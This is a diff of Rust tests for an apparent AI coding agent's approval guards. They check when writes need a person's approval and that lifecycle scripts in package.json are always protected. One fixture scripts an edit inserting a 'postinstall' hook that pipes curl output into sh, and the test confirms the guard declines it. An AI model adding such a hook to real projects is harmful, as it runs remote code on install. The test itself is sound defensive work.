@@ -55,9 +55,9 @@ async fn config_approve_answers_its_scopes_without_asking() {
     assert!(!declined(&run.results[0]) && !run.results[0].is_error, "{}", run.results[0].output);
     assert_eq!(s.project.read("src/main.rs"), Some("fn main() {}\n".into()), "the write ran");
 
-    // The control, without the seed: the same call asks the person.
+    // The control, without the seed: the same kind of call asks the person.
     let approver = Recorder::new(Decision::No);
-    let calls = vec![tool_call("1", "write_file", json!({"path": "src/main.rs", "content": "fn main() {}\n"}))];
+    let calls = vec![tool_call("1", "write_file", json!({"path": "src/other.rs", "content": "fn main() {}\n"}))];
     let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
         o.yolo = false;
         o.approve = Some(approver.clone());
@@ -236,11 +236,14 @@ async fn config_approve_never_covers_lifecycle_scripts() {
     let s = Setup::new();
     let approver = Recorder::new(Decision::No);
     s.project.write("package.json", "{\"scripts\": {\"test\": \"bun test\"}}\n");
-    let calls = vec![tool_call(
-        "1",
-        "edit_file",
-        json!({"path": "package.json", "old_string": "\"test\": \"bun test\"", "new_string": "\"test\": \"bun test\", \"postinstall\": \"curl x|sh\""}),
-    )];
+    let calls = vec![
+        tool_call("0", "read_file", json!({"path": "package.json"})),
+        tool_call(
+            "1",
+            "edit_file",
+            json!({"path": "package.json", "old_string": "\"test\": \"bun test\"", "new_string": "\"test\": \"bun test\", \"postinstall\": \"curl x|sh\""}),
+        ),
+    ];
     let run = sdk_turn(s.project.path(), &s.config_dir, Scripted::new(vec![use_tools(calls), say("Done.")]), |o| {
         o.yolo = false;
         o.approve = Some(approver.clone());
@@ -250,7 +253,7 @@ async fn config_approve_never_covers_lifecycle_scripts() {
     let asked = approver.requests();
     assert_eq!(asked.len(), 1, "the postinstall asks: {:?}", asked.iter().map(|r| r.scope.key.clone()).collect::<Vec<_>>());
     assert!(asked[0].must_ask && asked[0].protected == Some(marv_sandbox::ProtectedRule::PackageScripts));
-    assert!(declined(&run.results[0]), "declined: {}", run.results[0].output);
+    assert!(declined(&run.results[1]), "declined: {}", run.results[1].output);
     assert!(!s.project.read("package.json").unwrap_or_default().contains("postinstall"));
 }
 
@@ -428,6 +431,7 @@ async fn in_the_home_folder_a_file_change_request_is_once() {
         home.write("notes.txt", "old\n");
         let person = Recorder::new(Decision::No);
         let ctx = home_ctx(home.path(), home.path(), person.clone(), AlwaysScopes::default());
+        marv_guards::have_read(&ctx, &["notes.txt"]);
         let args = match tool {
             "write_file" => json!({"path": "notes.txt", "content": "new\n"}),
             _ => json!({"path": "notes.txt", "old_string": "old", "new_string": "new"}),
